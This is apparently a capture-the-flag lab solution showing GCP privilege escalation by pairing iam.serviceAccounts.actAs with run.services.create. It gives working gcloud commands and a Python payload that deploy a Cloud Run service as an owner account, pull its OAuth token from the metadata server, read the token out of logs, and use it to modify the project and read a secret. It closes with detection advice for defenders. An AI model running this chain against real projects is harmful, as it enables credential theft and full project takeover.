# Solution: Cloud Run Service Creation with actAs to Admin

If you know the classic AWS privilege escalation pair `iam:PassRole` + `lambda:CreateFunction`, you already understand this attack -- it's the same technique transplanted to GCP, with Cloud Run as the compute target. GCP's equivalent of PassRole is `iam.serviceAccounts.actAs`: the permission checked when a principal attaches a service account's identity to new compute. On its own, `actAs` looks like a routine automation grant -- it's what you'd hand a CI pipeline so its workloads run under a dedicated service account. The danger only materializes when the same principal can also *create* that compute. At that point, whoever holds both permissions can deploy arbitrary code running as any identity they can `actAs` -- and code running inside a GCP compute resource can simply ask the local metadata server for that identity's OAuth access token.

This exact path is catalogued as the `CREATE_CLOUDRUN_SERVICE_AS_SA` edge in NetSPI's [gcpwn](https://github.com/NetSPI/gcpwn) privilege escalation framework, where it is marked CONFIRMED with `actas_required: true` and a minimum of `run.services.create` + `actAs`. One detail of that edge definition deserves emphasis: the minimum does *not* include `artifactregistry.repositories.downloadArtifacts`. Deploying a Cloud Run service from a public Docker Hub image requires no registry access whatsoever -- Cloud Run's own service agent pulls `docker.io/...` images server-side. Teams that assume "no registry permissions means no deploy capability" are wrong. This lab walks through the full chain: deploy, execute, exfiltrate the token through the service's logs, and use it raw against Google's REST APIs.

## The Challenge

You start as `pl-prod-cr001-start`, a service account with no project-level IAM roles of its own. It can't read Secret Manager secrets, can't touch project metadata, and -- importantly -- it has no `roles/iam.serviceAccountTokenCreator` grant on anyone, so it cannot mint tokens for other identities directly. Plain `gcloud --impersonate-service-account` gets you nowhere.

What it *does* have is two minimal custom roles. The first, `gcp_cloudrun_001_sa_actas_min`, is bound directly on a second service account, `pl-prod-cr001-target`, and carries a single permission:

- `iam.serviceAccounts.actAs`

The second, `gcp_cloudrun_001_cr_deploy_req`, is bound at the project level and carries four:

- `run.services.create`
- `run.services.get`
- `run.operations.get`
- `logging.logEntries.list`

Individually, each grant looks defensible -- a deployment service account that can create Cloud Run services, watch its deploys, and read its logs. Together, they are a complete privilege escalation primitive. The target service account, `pl-prod-cr001-target`, holds `roles/owner` on the project, which includes access to the CTF flag secret. Your job is to run code as that account.

## Reconnaissance

Confirm your starting identity and its blind spots:

```bash
gcloud secrets versions access latest --secret=pl-gcp-cloudrun-001-flag \
  --impersonate-service-account=pl-prod-cr001-start@<project_id>.iam.gserviceaccount.com
# ERROR: (gcloud.secrets.versions.access) PERMISSION_DENIED: Permission
# 'secretmanager.versions.access' denied on resource ...
```

No direct access, as expected. Next, look at what other service accounts exist and which of them matter:

```bash
gcloud iam service-accounts list --format='value(email)'
# pl-prod-cr001-start@<project_id>.iam.gserviceaccount.com
# pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com

gcloud projects get-iam-policy <project_id> \
  --flatten="bindings[].members" \
  --filter="bindings.members:pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com" \
  --format="table(bindings.role)"
# roles/owner
```

`roles/owner` on `pl-prod-cr001-target`. That's the prize. Now check what your own identity can do *with* that account:

```bash
gcloud iam service-accounts get-iam-policy \
  pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com
```

The policy includes a binding granting `gcp_cloudrun_001_sa_actas_min` to the starting service account -- and that role contains `iam.serviceAccounts.actAs`. You are allowed to attach this account's identity to new compute you create. Combined with the `run.services.create` in your project-level binding, that's the entire vulnerability: actAs + create, the PassRole analog, delivered through a custom role that never trips a `roles/run.admin` or `roles/iam.serviceAccountUser` alert. A quick `gcloud run services list` (via `run.services.list` in your helpful role) confirms Cloud Run is live in the project and ready to receive your service.

## Exploitation

The plan: deploy a Cloud Run service that runs as `pl-prod-cr001-target`, whose container code fetches its own runtime identity's OAuth token from the metadata server and prints it somewhere you can read. You already have the read channel -- `logging.logEntries.list` lets you read Cloud Run logs. That's gcpwn's `--exfil-mode logs` pattern: exfiltration through the very log entries the deployment produces.

Start with the deploy itself, using a public Docker Hub base image so no registry interaction is ever needed:

```bash
gcloud run deploy pl-cr001-exfil-<resource_suffix> \
  --image=docker.io/library/python:3.13-slim \
  --region=<region> \
  --service-account=pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com \
  --command=python \
  --args=-c \
  --args='import os;exec(os.environ["EXFIL_PAYLOAD"])' \
  --env-vars-file=<payload.yaml> \
  --no-allow-unauthenticated \
  --impersonate-service-account=pl-prod-cr001-start@<project_id>.iam.gserviceaccount.com
```

Several deliberate choices are baked into that command. The `--service-account` flag is only accepted because you hold `actAs` on the target -- GCP checks it at service creation time, which is precisely why this permission is the PassRole analog. `--no-allow-unauthenticated` keeps the service private and, as a side effect, means gcloud never issues the `run.services.setIamPolicy` call it would otherwise make to set public access -- you don't have that permission, and you don't need it. And the payload travels in the `EXFIL_PAYLOAD` environment variable rather than on the command line because gcloud's `--args` list splits values on commas (repeated `--args` flags and backslash-escaping both fail to carry a literal comma through), and any nontrivial Python one-liner is full of commas. The `--env-vars-file` is parsed as YAML, so a JSON file written by `jq` passes through cleanly. The actual payload, stored in that env file:

```python
import os
import urllib.request
import http.server
B="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
H={"Metadata-Flavor":"Google"}
def q(p):
    return urllib.request.urlopen(urllib.request.Request(B+p,headers=H)).read().decode()
print("EXFIL_EMAIL: "+q("email"),flush=True)
print("EXFIL_TOKEN: "+q("token"),flush=True)
# ...then serve HTTP forever so the service stays healthy
```

Every `print` carries `flush=True`, and that is not a style choice: container stdout is block-buffered when piped to the logging agent, and an unflushed token print simply never reaches Cloud Logging.

The deploy is asynchronous. `gcloud run deploy` blocks until Ready for you, but if you were driving the raw Cloud Run v2 REST API instead (as the lab's `--api-only` demo mode does), you would POST to `https://run.googleapis.com/v2/projects/{project_id}/locations/{region}/services?serviceId={service}`, poll the returned long-running operation via `run.operations.get` until `done: true`, and fetch the service URL with a `run.services.get` call that returns `urls[0]`. Same attack, thinner permission surface -- exactly the minimum the gcpwn edge defines.

Cloud Run scales to zero, so the container only starts once a request arrives. Invoke the private service with an OIDC identity token minted as the starting account:

```bash
ID_TOKEN=$(gcloud auth print-identity-token \
  --impersonate-service-account=pl-prod-cr001-start@<project_id>.iam.gserviceaccount.com \
  --audiences=<service_url>)
curl -H "Authorization: Bearer $ID_TOKEN" <service_url>
```

This invocation exercises `run.routes.invoke` (a helpful permission, not a required one -- if you lacked it, the invoke would 403, but the deploy-time readiness instance already runs the payload and prints the token, so the attack succeeds either way). Then read the exfiltrated token from the logs, using the same channel gcpwn uses:

```bash
gcloud logging read \
  'resource.type=cloud_run_revision AND resource.labels.service_name=pl-cr001-exfil-<resource_suffix> AND resource.labels.location=<region>' \
  --project=<project_id> \
  --impersonate-service-account=pl-prod-cr001-start@<project_id>.iam.gserviceaccount.com \
  --limit=20 --format='value(textPayload)'
# EXFIL_EMAIL: pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com
# EXFIL_TOKEN: {"access_token":"ya29.<token>","expires_in":3599,...}
```

## Verification

You now hold a raw OAuth bearer token belonging to `pl-prod-cr001-target`. First, prove the token really belongs to the target -- using the raw token directly against Google's tokeninfo endpoint, no gcloud impersonation anywhere in the picture:

```bash
curl "https://oauth2.googleapis.com/tokeninfo?access_token=$EXFILTRATED_TOKEN"
# "email": "pl-prod-cr001-target@<project_id>.iam.gserviceaccount.com"
```

Then prove the token carries the target's `roles/owner` privileges by writing a project label with it. The Resource Manager v1 `projects.update` method is a synchronous `PUT` of the full Project resource (`resourcemanager.projects.update`, which `roles/owner` includes) -- fetch the project, add a label, and PUT it back:

```bash
PROJECT_JSON=$(curl -s -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>")
UPDATED=$(echo "$PROJECT_JSON" | jq -c '.labels = ((.labels // {}) + {"pl-privesc-verified":"true"})')
curl -X PUT \
  -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  -H "Content-Type: application/json" \
  -d "$UPDATED" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/<project_id>"
```

(Note the shape: v1 `projects.update` is a full-resource `PUT`, not the `PATCH`+`updateMask` of the async v3 API -- a `PATCH` to the v1 endpoint silently no-ops.) The write succeeds where your starting account would have been denied -- direct evidence that the stolen token authenticates as a project owner. The demo restores the original labels immediately afterward.

## Capture the Flag

The CTF flag lives as the latest version of the Secret Manager secret `pl-gcp-cloudrun-001-flag`. Read it with the raw stolen token:

```bash
curl -H "Authorization: Bearer $EXFILTRATED_TOKEN" \
  "https://secretmanager.googleapis.com/v1/projects/<project_id>/secrets/pl-gcp-cloudrun-001-flag/versions/latest:access"
```

The response payload is base64-encoded; decode it to get the flag.

This works because `roles/owner` natively includes `secretmanager.versions.access`, so controlling the target service account is sufficient to read the flag -- no extra grant is involved. The exfiltrated token authenticates as the target account, so it carries all of the owner role's project-wide permissions. And because the token is raw credential material rather than an impersonation session, you never needed any token-creator role on the target -- the metadata server inside your malicious service handed you the token without ever checking who you were.

## What Happened

You escalated from a service account with zero project-level permissions to one holding `roles/owner` -- and from there to a project secret -- by combining permissions that look individually reasonable: the ability to attach a service account to new compute (`actAs`), the ability to create that compute (`run.services.create`), and the ability to read the logs it produces (`logging.logEntries.list`). Neither `actAs` nor `run.services.create` alone would have gotten you anywhere; together they let you build a purpose-built credential thief, deploy it under someone else's identity, and read the stolen token out of your own deployment logs.

The pattern generalizes to every GCP compute service that accepts a `--service-account` flag at creation time -- Compute Engine, Cloud Run, GKE, Cloud Functions, Cloud Build -- and the public Docker Hub image detail matters for defenders: this attack needs no registry permissions, no Cloud Build, and no source upload. It also slips past tooling that only watches for the conspicuous predefined roles (`roles/run.admin`, `roles/iam.serviceAccountUser`), because the whole pairing here hides inside two small custom roles. The detection story has to live in behavior: a Cloud Run service created by a caller whose attached runtime identity differs from their own, followed by that caller reading the service's logs, is the signature of a PassRole-style theft -- no matter which role delivered the permissions.
